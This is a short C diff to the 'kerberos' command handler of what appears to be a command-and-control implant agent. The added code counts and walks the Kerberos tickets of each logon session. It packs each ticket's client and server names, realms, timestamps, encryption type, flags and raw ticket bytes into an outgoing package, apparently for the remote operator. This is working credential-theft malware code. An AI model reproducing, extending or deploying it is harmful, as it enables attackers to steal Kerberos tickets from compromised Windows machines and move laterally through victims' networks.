@@ -2914,6 +2914,8 @@ VOID Commandkerberos( PPARSER Parser )
             PSESSION_INFORMATION SessionTmp  = NULL;
             DWORD                NumSessions = 0;
             LUID                 luid        = (LUID){.HighPart = 0, .LowPart = 0};
+            DWORD                NumTickets  = 0;
+            PTICKET_INFORMATION  TicketTmp   = NULL;
 
             Type = ParserGetInt32( Parser );
             // Type 0: /all
@@ -2949,8 +2951,38 @@ VOID Commandkerberos( PPARSER Parser )
                 PackageAddBytes( Package, Sessions->LogonServerDNSDomain, StringLengthW( Sessions->LogonServerDNSDomain ) * 2 );
                 PackageAddBytes( Package, Sessions->Upn, StringLengthW( Sessions->Upn ) * 2 );
 
-                MemSet( Sessions, 0, sizeof( SESSION_INFORMATION ) );
-                Instance.Win32.LocalFree( Sessions );
+                for ( NumTickets = 0, TicketTmp = Sessions->Tickets; TicketTmp; NumTickets++, TicketTmp = TicketTmp->Next ){}
+
+                PackageAddInt32( Package, NumTickets );
+
+                while ( Sessions->Tickets )
+                {
+                    TicketTmp = Sessions->Tickets->Next;
+
+                    PackageAddBytes( Package, Sessions->Tickets->ClientName, StringLengthW( Sessions->Tickets->ClientName ) * 2 );
+                    PackageAddBytes( Package, Sessions->Tickets->ClientRealm, StringLengthW( Sessions->Tickets->ClientRealm ) * 2 );
+                    PackageAddBytes( Package, Sessions->Tickets->ServerName, StringLengthW( Sessions->Tickets->ServerName ) * 2 );
+                    PackageAddBytes( Package, Sessions->Tickets->ServerRealm, StringLengthW( Sessions->Tickets->ServerRealm ) * 2 );
+                    PackageAddInt32( Package, Sessions->Tickets->StartTime.LowPart );
+                    PackageAddInt32( Package, Sessions->Tickets->StartTime.HighPart );
+                    PackageAddInt32( Package, Sessions->Tickets->EndTime.LowPart );
+                    PackageAddInt32( Package, Sessions->Tickets->EndTime.HighPart );
+                    PackageAddInt32( Package, Sessions->Tickets->RenewTime.LowPart );
+                    PackageAddInt32( Package, Sessions->Tickets->RenewTime.HighPart );
+                    PackageAddInt32( Package, Sessions->Tickets->EncryptionType );
+                    PackageAddInt32( Package, Sessions->Tickets->TicketFlags );
+                    PackageAddBytes( Package, Sessions->Tickets->Ticket.Buffer, Sessions->Tickets->Ticket.Length );
+
+                    if ( Sessions->Tickets->Ticket.Buffer )
+                    {
+                        DATA_FREE( Sessions->Tickets->Ticket.Buffer, Sessions->Tickets->Ticket.Length );
+                    }
+
+                    DATA_FREE( Sessions->Tickets, sizeof( TICKET_INFORMATION ) );
+                    Sessions->Tickets = TicketTmp;
+                }
+
+                DATA_FREE( Sessions, sizeof( SESSION_INFORMATION ) );
                 Sessions = SessionTmp;
             }
 
